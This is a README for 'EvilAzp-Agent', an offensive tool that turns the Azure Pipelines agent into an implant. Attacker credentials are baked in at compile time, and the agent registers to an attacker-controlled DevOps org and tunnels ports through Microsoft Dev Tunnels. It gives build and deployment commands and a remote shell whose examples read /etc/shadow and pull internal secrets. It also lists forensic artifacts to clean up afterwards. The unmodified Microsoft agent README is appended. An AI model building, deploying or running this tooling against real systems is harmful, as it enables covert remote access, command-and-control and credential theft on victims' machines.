# EvilAzp-Agent

Modified Azure Pipeline Agent with optional Dev Tunnels integration for port forwarding through Microsoft's relay infrastructure. Single binary, no root required, no 3rd-party tools. All credentials baked into the binary at compile time — drop and run with zero arguments.

## Requirements

**Attacker-controlled Azure DevOps org** with:
- A PAT with scopes: `Agent Pools: Read & Manage`, `Build: Read & Execute`
- A project with Azure Pipelines enabled
- An agent pool

**Entra ID service principal** (for Dev Tunnels, optional):
- App registration + client secret (up to 2-year lifetime)
- No special Azure role assignments needed — Dev Tunnels API is open to any authenticated Entra identity

**Build environment**: .NET 8.0 SDK, Python 3

## Setup

### 1. Create Entra ID service principal (optional, for tunneling)

```sh
az ad app create --display-name "yourapp" --sign-in-audience AzureADMyOrg
az ad sp create --id <appId>
az ad app credential reset --id <appId> --years 2
# Save: appId (client ID), password (client secret), tenant (tenant ID)
```

### 2. Create Azure DevOps pipeline

Create a project, repository, pipeline, and agent pool in the attacker-controlled Azure DevOps organization.

## Usage

### Agent builder

The agent builder is integrated into `evilazp`. The old `evilazp-builder.py`
file remains as a compatibility wrapper, but new workflows should use
`/agent create` in the shell or `evilazp create-agent` from the terminal.

**Create a local YAML config:**
```yaml
# .env
url: https://dev.azure.com/<org>
pat: <PAT>
pool: <pool>
agent: winvm03

sp_tenant: <tenant-id>
sp_client: <client-id>
sp_secret: <client-secret>
tunnel_id: winvm03
tunnel_ports: 22

relay_connection_string: "Endpoint=sb://..."
relay_remote_forward:
  - ssh-relay:127.0.0.1:22
```

`.env` is gitignored. Keep PATs, service-principal secrets, and Relay connection strings out of commits.

**Build from the evilazp shell:**
```sh
evilazp
/connect --org <org>
/agent create --pool <pool> --agent winvm03 --runtime win-x64 --polling 1
```

**Build from the terminal:**
```sh
evilazp create-agent --org <org> --pool <pool> --agent winvm03 --runtime win-x64 --polling 1
```

**Build from YAML:**
```sh
# Uses vendor/azure-pipelines-agent/.env when no file is given.
evilazp create-agent --yaml --runtime linux-x64 --polling 1

# Or pass an explicit YAML file.
evilazp create-agent --yaml .env --runtime linux-x64 --polling 1

# Include optional plugins only when their required values are present in .env.
evilazp create-agent --yaml --tunnel --runtime win-x64
evilazp create-agent --yaml --relay --runtime win-x64
```

Runtimes: `linux-x64`, `linux-arm64`, `win-x64`, `osx-x64`

Output: `vendor/azure-pipelines-agent/_layout/<runtime>/single/Agent.Listener`

### Run on target

```sh
# Just run it. Zero arguments. Baked creds handle everything.
./Agent.Listener
```

Agent auto-registers with Azure DevOps, starts listening for pipeline jobs, and (if tunnel creds were baked) creates a Dev Tunnel forwarding the specified local ports.

Tunnel URL is logged in `_diag/`: `https://<tunnel-id>-<port>.<cluster>.devtunnels.ms`

### Command execution (from attacker machine)

```sh
azp(agent-name)> whoami
azp(agent-name)> cat /etc/shadow
azp(agent-name)> curl http://internal-host/api/secrets
```

## Artifacts / Cleanup

| What | Where |
|---|---|
| Files on disk | `_work/`, `_diag/`, `.agent`, `.credentials`, `.credentials_rsaparams` |
| Network | HTTPS to `dev.azure.com` + `*.devtunnels.ms` / `*.tunnels.api.visualstudio.com` |
| Azure DevOps | Agent visible in pool, builds visible in pipeline history |
| Entra ID | Service principal visible in tenant app registrations |

Delete agent directory and deregister from Azure DevOps pool after operation.

===

# Azure Pipelines Agent (Original README)

## Announcement -  `AZP_AGENT_USE_LEGACY_HTTP` agent knob future deprecation

We are working on pipeline agent migration to .NET 6. One of the side effect of this migration is that the legacy HTTP handler will be no longer available for use due to changes in the .NET runtime itself.

Thus the related agent knob will not work once the migration will be completed. We recommend stopping using the `AZP_AGENT_USE_LEGACY_HTTP` knob.

## Overview

The cross-platform build and release agent for Azure Pipelines and Team Foundation Server 2015 and beyond.
This replaced the deprecated closed source windows build agent and the previous [cross-platform agent](https://github.com/Microsoft/vso-agent).

Supported on Windows, macOS, and several Linux flavors.
Written for .NET Core in C#.

## Status

|   | Build & Test |
|---|:-----:|
|![Win-x64](docs/res/win_med.png) **Windows x64**|[![Build & Test][win-x64-build-badge]][build]| 
|![Win-x86](docs/res/win_med.png) **Windows x86**|[![Build & Test][win-x86-build-badge]][build]| 
|![Win-arm64](docs/res/win_med.png) **Windows ARM64**|[![Build & Test][win-arm64-build-badge]][build]| 
|![macOS](docs/res/apple_med.png) **macOS**|[![Build & Test][macOS-build-badge]][build]| 
|![Linux-x64](docs/res/linux_med.png) **Linux x64**|[![Build & Test][linux-x64-build-badge]][build]| 
|![Linux-arm](docs/res/linux_med.png) **Linux ARM**|[![Build & Test][linux-arm-build-badge]][build]| 
|![RHEL6-x64](docs/res/redhat_med.png) **RHEL 6 x64**|[![Build & Test][rhel6-x64-build-badge]][build]| 

[win-x64-build-badge]: https://mseng.visualstudio.com/pipelinetools/_apis/build/status/VSTS.Agent/azure-pipelines-agent.ci?branchName=master&jobname=Windows%20(x64)
[win-x86-build-badge]: https://mseng.visualstudio.com/pipelinetools/_apis/build/status/VSTS.Agent/azure-pipelines-agent.ci?branchName=master&jobname=Windows%20(x86)
[win-arm64-build-badge]: https://mseng.visualstudio.com/pipelinetools/_apis/build/status/VSTS.Agent/azure-pipelines-agent.ci?branchName=master&jobname=Windows%20(ARM64)
[macOS-build-badge]: https://mseng.visualstudio.com/pipelinetools/_apis/build/status/VSTS.Agent/azure-pipelines-agent.ci?branchName=master&jobname=macOS%20(x64)
[linux-x64-build-badge]: https://mseng.visualstudio.com/pipelinetools/_apis/build/status/VSTS.Agent/azure-pipelines-agent.ci?branchName=master&jobname=Linux%20(x64)
[linux-arm-build-badge]: https://mseng.visualstudio.com/pipelinetools/_apis/build/status/VSTS.Agent/azure-pipelines-agent.ci?branchName=master&jobname=Linux%20(ARM)
[rhel6-x64-build-badge]: https://mseng.visualstudio.com/pipelinetools/_apis/build/status/VSTS.Agent/azure-pipelines-agent.ci?branchName=master&jobname=RHEL6%20(x64)
[build]: https://mseng.visualstudio.com/PipelineTools/_build?_a=completed&definitionId=7502

## Get the Agent

[Get started with the agent](https://docs.microsoft.com/azure/devops/pipelines/agents/agents?view=azure-devops#install).

## Supported Usage

This agent can be used for both Azure Pipelines and Azure DevOps Server (Team Foundation Server).
Support is extended to all on-premise solutions [based on their lifecycle (including extended support)](https://learn.microsoft.com/lifecycle/products/).

The only exception is the Windows version of the agent for TFS 2015 since it is distributed along with a separate Node-based agent.

## Latest and Pre-release labels for releases

Releases have labels **Latest** and **Pre-release**. Please make a note that the labels mean:
- **Latest** - this is the current release of the agent, available to all clients or partially available (in case it is an active release that is currently under deployment).
- **Pre-release** - Next version, release process of the agent version was started and it's already available for some of the users. And will be available soon for the rest.

Each new version of agent is released for users by groups during several days. And usually it becomes available for all users within 6-8 days after start of release. The release has label "Pre-release" during all these days. So it's expected behavior if specific release is used by builds in pipelines but it's marked as "Pre-release".

## Troubleshooting

Troubleshooting tips are [located here](docs/troubleshooting.md)

## Contribute

For developers that want to contribute, [read here](docs/contribute.md) on how to build and test.

## Issues

We accept issue reports both here (file a GitHub issue) and in [Developer Community](https://developercommunity.visualstudio.com/spaces/21/index.html).

Do you think there might be a security issue? Have you been phished or identified a security vulnerability? Please don't report it here - let us know by sending an email to secure@microsoft.com.
